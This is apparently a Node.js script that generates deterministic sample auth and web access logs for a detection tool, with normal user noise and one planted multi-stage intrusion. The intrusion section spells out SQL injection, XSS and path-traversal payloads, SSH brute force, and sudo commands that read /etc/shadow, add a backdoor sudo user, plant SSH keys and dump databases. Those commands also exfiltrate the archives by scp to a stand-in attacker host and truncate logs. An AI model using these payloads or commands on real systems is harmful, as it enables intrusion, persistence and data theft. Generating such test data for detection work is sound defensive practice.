// Generates realistic sample logs with ONE planted multi-stage attack plus
// some background noise, so we can prove detection works AND that normal
// users don't get flagged. Deterministic (seeded) so tests are stable.
//
//   node scripts/generate-logs.js            -> writes ../samples/*.log
//
import { writeFile, mkdir } from 'node:fs/promises';

function rng(seed) {
  // mulberry32
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const MON = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
const pad = (n, w = 2) => String(n).padStart(w, '0');
const syslogTime = (d) => `${MON[d.getUTCMonth()]} ${String(d.getUTCDate()).padStart(2, ' ')} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())}`;
const nginxTime = (d) => `${pad(d.getUTCDate())}/${MON[d.getUTCMonth()]}/${d.getUTCFullYear()}:${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())} +0000`;

export const ATTACKER_IP = '203.0.113.45';
export const NOISE_IP = '198.51.100.77';

export function generate({ seed = 42, start = '2026-10-01T00:00:00Z', days = 3 } = {}) {
  const r = rng(seed);
  const pick = (arr) => arr[Math.floor(r() * arr.length)];
  const int = (lo, hi) => lo + Math.floor(r() * (hi - lo + 1));
  const t0 = new Date(start).getTime();
  const at = (day, h, m = 0, s = 0) => new Date(t0 + day * 86_400_000 + ((h * 60 + m) * 60 + s) * 1000);

  const auth = []; // [Date, line]
  const web = [];
  let pid = 1200;
  const sshd = (d, msg) => auth.push([d, `${syslogTime(d)} web01 sshd[${pid++}]: ${msg}`]);
  const sudo = (d, user, cmd, runAs = 'root') => auth.push([d, `${syslogTime(d)} web01 sudo: ${user.padStart(8)} : TTY=pts/${int(0, 3)} ; PWD=/home/${user} ; USER=${runAs} ; COMMAND=${cmd}`]);
  const sudoDenied = (d, user, cmd) => auth.push([d, `${syslogTime(d)} web01 sudo: ${user.padStart(8)} : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/${user} ; USER=root ; COMMAND=${cmd}`]);
  const req = (d, ip, user, method, path, status, bytes, ua = UA_BROWSER) =>
    web.push([d, `${ip} - ${user || '-'} [${nginxTime(d)}] "${method} ${path} HTTP/1.1" ${status} ${bytes} "-" "${ua}"`]);

  const UA_BROWSER = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36';
  const UA_MAC = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15';

  // ---------------------------------------------------------------- normal
  const engineers = [
    { user: 'alice', ip: '10.0.1.11' },
    { user: 'bob', ip: '10.0.1.12' },
    { user: 'carol', ip: '10.0.1.13' },
    { user: 'dave', ip: '10.0.1.14' },
    { user: 'devops', ip: '10.0.1.20' },
    { user: 'guest', ip: '10.0.1.30' },
  ];
  const appUsers = ['mike', 'priya', 'arjun', 'sneha', 'rahul', 'kiran', 'meera', 'vikram', 'ananya', 'rohit', 'neha', 'sai'].map((u, i) => ({
    user: u,
    ip: `10.0.2.${20 + i}`,
  }));
  const publicPaths = ['/', '/products', '/products/12', '/products/7', '/about', '/contact', '/static/app.js', '/static/style.css', '/static/logo.png', '/api/products?page=1', '/api/products?page=2', '/blog/release-notes'];
  const appPaths = ['/dashboard', '/api/orders', '/api/orders?status=open', '/api/customers?page=1', '/api/reports/daily', '/api/cart', '/settings', '/api/notifications'];

  for (let day = 0; day < days; day++) {
    // engineers ssh in during IST office hours (03:00 - 13:00 UTC)
    for (const eng of engineers) {
      const sessions = int(1, 3);
      for (let s = 0; s < sessions; s++) {
        const login = at(day, int(3, 12), int(0, 59), int(0, 59));
        if (r() < 0.08) sshd(new Date(login - 9000), `Failed password for ${eng.user} from ${eng.ip} port ${int(40000, 60000)} ssh2`); // typo
        sshd(login, `Accepted ${r() < 0.6 ? 'publickey' : 'password'} for ${eng.user} from ${eng.ip} port ${int(40000, 60000)} ssh2`);
        if (eng.user === 'devops') {
          const cmds = ['/usr/bin/systemctl restart nginx', '/usr/bin/apt update', '/usr/bin/tail -n 200 /var/log/nginx/error.log', '/usr/bin/docker ps', '/usr/bin/journalctl -u app --since today'];
          for (let c = 0; c < int(1, 3); c++) sudo(new Date(+login + int(60, 1500) * 1000), 'devops', pick(cmds));
        }
        if (eng.user === 'alice' && r() < 0.5) sudo(new Date(+login + 300_000), 'alice', '/usr/bin/systemctl status app');
        sshd(new Date(+login + int(20, 180) * 60_000), `Disconnected from user ${eng.user} ${eng.ip} port ${int(40000, 60000)}`);
      }
    }

    // CI deploy account - every 6 hours from the build server
    for (const h of [0, 6, 12, 18]) {
      const d = at(day, h, 5, int(0, 30));
      sshd(d, `Accepted publickey for deploy from 10.0.5.20 port ${int(40000, 60000)} ssh2`);
      sudo(new Date(+d + 20_000), 'deploy', '/usr/bin/systemctl restart app');
      sshd(new Date(+d + 60_000), `Disconnected from user deploy 10.0.5.20 port ${int(40000, 60000)}`);
    }

    // internet background noise: a few low-and-slow failed root logins (should NOT alert)
    for (let n = 0; n < 6; n++) {
      const ip = `${int(45, 220)}.${int(1, 254)}.${int(1, 254)}.${int(1, 254)}`;
      const d = at(day, int(0, 23), int(0, 59));
      for (let k = 0; k < int(1, 3); k++) sshd(new Date(+d + k * 4000), `Failed password for ${pick(['root', 'admin'])} from ${ip} port ${int(40000, 60000)} ssh2`);
    }

    // app users: login in the morning, then browse
    for (const u of appUsers) {
      let tm = at(day, int(3, 5), int(0, 59), int(0, 59));
      if (r() < 0.07) req(new Date(+tm - 15000), u.ip, null, 'POST', '/login', 401, 312, UA_MAC);
      req(tm, u.ip, u.user, 'POST', '/login', 302, 0, UA_MAC);
      const n = int(25, 70);
      for (let k = 0; k < n; k++) {
        tm = new Date(+tm + int(20, 600) * 1000);
        if (tm.getUTCHours() > 13) break;
        const path = pick(appPaths);
        req(tm, u.ip, u.user, 'GET', path, 200, int(800, 60000), UA_MAC);
      }
      if (r() < 0.3) req(new Date(+tm + 30_000), u.ip, u.user, 'GET', '/api/reports/export?range=week', 200, int(400_000, 2_500_000), UA_MAC);
    }

    // anonymous visitors
    for (let v = 0; v < 260; v++) {
      const ip = `${int(1, 223)}.${int(0, 255)}.${int(0, 255)}.${int(1, 254)}`;
      let tm = at(day, int(0, 23), int(0, 59), int(0, 59));
      for (let k = 0; k < int(1, 8); k++) {
        tm = new Date(+tm + int(2, 90) * 1000);
        const path = r() < 0.04 ? pick(['/favicon.ico', '/products/999', '/old-page']) : pick(publicPaths);
        const status = path === '/favicon.ico' || path === '/products/999' || path === '/old-page' ? 404 : 200;
        const bytes = status === 404 ? 153 : path.includes('/static/') ? int(20_000, 180_000) : int(1500, 40_000);
        req(tm, ip, null, 'GET', path, status, bytes, r() < 0.5 ? UA_BROWSER : UA_MAC);
      }
      if (r() < 0.05) req(new Date(+tm + 5000), ip, null, 'GET', '/downloads/catalog.pdf', 200, 2_400_000, UA_BROWSER);
    }
  }

  // ------------------------------------------------- distractors / noise
  // a noisy but unsuccessful brute force on day 1 (should be a separate, lower incident)
  {
    let d = at(0, 14, 2, 0);
    const users = ['root', 'root', 'root', 'admin', 'root', 'ubuntu', 'root'];
    for (let k = 0; k < 28; k++) {
      d = new Date(+d + int(3, 9) * 1000);
      sshd(d, `Failed password for ${k % 4 === 0 ? 'invalid user ' : ''}${pick(users)} from ${NOISE_IP} port ${int(40000, 60000)} ssh2`);
    }
  }
  // carol logs in from home on the evening of day 3 (new IP + odd hour -> low/medium, not critical)
  sshd(at(2, 17, 40, 12), `Accepted publickey for carol from 49.36.122.18 port 51514 ssh2`);
  sshd(at(2, 18, 2, 40), `Disconnected from user carol 49.36.122.18 port 51514`);
  // guest tries sudo once
  sudoDenied(at(1, 9, 12, 0), 'guest', '/usr/bin/apt install htop');

  // ------------------------------------------------------- the attack (day 3)
  const A = ATTACKER_IP;
  const D = 2;
  // 1) recon: directory brute forcing the web app
  {
    let d = at(D, 1, 48, 0);
    const probes = ['/.env', '/.git/config', '/wp-admin/', '/wp-login.php', '/phpmyadmin/', '/admin', '/admin/login', '/backup.zip', '/config.json', '/server-status', '/actuator/health', '/api/v1/users', '/.aws/credentials', '/.DS_Store', '/xmlrpc.php'];
    const words = ['test', 'old', 'dev', 'staging', 'tmp', 'private', 'uploads', 'files', 'db', 'sql', 'logs', 'internal', 'debug', 'console', 'panel', 'portal', 'beta', 'v2', 'api/v2', 'cgi-bin/'];
    for (const p of probes) {
      d = new Date(+d + int(1, 4) * 1000);
      req(d, A, null, 'GET', p, p === '/admin' ? 302 : 404, 153, 'gobuster/3.6');
    }
    for (const w of words) {
      d = new Date(+d + int(1, 3) * 1000);
      req(d, A, null, 'GET', `/${w}`, 404, 153, 'gobuster/3.6');
    }
  }
  // 2) exploitation: SQL injection attempts on the product page
  {
    let d = at(D, 1, 58, 10);
    const payloads = [
      "/products?id=12'",
      "/products?id=12' OR '1'='1",
      '/products?id=12%20UNION%20SELECT%20null,null,null--',
      '/products?id=12%20UNION%20SELECT%20username,password,null%20FROM%20users--',
      '/products?id=12%20AND%20SLEEP(5)--',
      '/products?id=12;%20DROP%20TABLE%20users--',
      '/search?q=%3Cscript%3Ealert(1)%3C/script%3E',
      '/download?file=../../../../etc/passwd',
    ];
    for (const p of payloads) {
      d = new Date(+d + int(5, 25) * 1000);
      req(d, A, null, 'GET', p, p.includes('UNION') && p.includes('username') ? 200 : 500, p.includes('username') ? 4821 : 312, 'sqlmap/1.8.4#stable');
    }
  }
  // 3) credential access: ssh brute force + spraying usernames
  let d = at(D, 2, 10, 5);
  const targets = ['root', 'admin', 'ubuntu', 'test', 'oracle', 'postgres', 'deploy', 'git', 'jenkins', 'deploy', 'deploy'];
  for (let k = 0; k < 46; k++) {
    d = new Date(+d + int(10, 30) * 1000);
    const u = targets[k % targets.length];
    const invalid = !['root', 'deploy', 'ubuntu'].includes(u);
    sshd(d, `Failed password for ${invalid ? 'invalid user ' : ''}${u} from ${A} port ${int(40000, 60000)} ssh2`);
  }
  // 4) initial access: weak password on the deploy account works
  d = at(D, 2, 31, 40);
  sshd(d, `Accepted password for deploy from ${A} port 50311 ssh2`);
  // 5) privilege escalation, persistence, collection, cleanup
  const steps = [
    [1, 32, '/bin/cat /etc/shadow'],
    [2, 10, '/usr/sbin/useradd -m -s /bin/bash sysupdate'],
    [2, 40, '/usr/sbin/usermod -aG sudo sysupdate'],
    [3, 30, '/usr/bin/tee -a /root/.ssh/authorized_keys'],
    [4, 15, '/usr/bin/crontab -e'],
    [9, 0, '/bin/tar czf /tmp/.cache.tgz /var/www/app /etc/app'],
    [12, 30, '/usr/bin/mysqldump --all-databases -r /tmp/.db.sql'],
    [14, 0, '/usr/bin/scp /tmp/.cache.tgz /tmp/.db.sql loot@203.0.113.45:/drop/'],
    [21, 5, '/usr/bin/truncate -s 0 /var/log/nginx/access.log.1'],
  ];
  for (const [m, s, cmd] of steps) sudo(new Date(+d + (m * 60 + s) * 1000), 'deploy', cmd);
  // 6) the web side: stolen admin creds (from the db dump) used on the app + bulk export
  {
    let w = at(D, 2, 46, 0);
    for (let k = 0; k < 7; k++) {
      w = new Date(+w + int(3, 8) * 1000);
      req(w, A, null, 'POST', '/login', 401, 312, UA_BROWSER);
    }
    w = new Date(+w + 6000);
    req(w, A, 'mike', 'POST', '/login', 302, 0, UA_BROWSER);
    for (const p of ['/dashboard', '/api/customers?page=1', '/settings']) {
      w = new Date(+w + int(5, 20) * 1000);
      req(w, A, 'mike', 'GET', p, 200, int(5000, 30000), UA_BROWSER);
    }
    for (const t of ['customers', 'orders', 'payments']) {
      w = new Date(+w + int(30, 90) * 1000);
      req(w, A, 'mike', 'GET', `/api/export?table=${t}&format=csv&limit=all`, 200, int(52_000_000, 78_000_000), 'python-requests/2.32');
    }
  }
  sshd(at(D, 2, 58, 30), `Disconnected from user deploy ${A} port 50311`);

  const toText = (rows) => rows.sort((a, b) => a[0] - b[0]).map((x) => x[1]).join('\n') + '\n';
  return { auth: toText(auth), access: toText(web) };
}

if (process.argv[1]?.endsWith('generate-logs.js')) {
  const out = new URL('../../samples/', import.meta.url);
  await mkdir(out, { recursive: true });
  const { auth, access } = generate();
  await writeFile(new URL('auth.log', out), auth);
  await writeFile(new URL('access.log', out), access);
  console.log(`wrote samples/auth.log (${auth.split('\n').length - 1} lines), samples/access.log (${access.split('\n').length - 1} lines)`);
}
